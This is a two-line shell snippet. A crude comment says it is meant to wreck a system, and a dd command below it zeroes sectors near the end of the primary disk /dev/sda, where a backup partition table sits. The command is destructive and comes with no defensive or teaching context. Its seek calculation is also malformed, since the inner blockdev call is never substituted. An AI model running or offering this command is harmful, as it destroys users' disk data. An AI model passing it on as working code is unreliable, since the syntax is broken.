#only use to really fuck up your system
dd if=/dev/zero of=/dev/sda bs=512 count=4096 seek=$(expr blockdev --getsz /dev/sda - 4096)
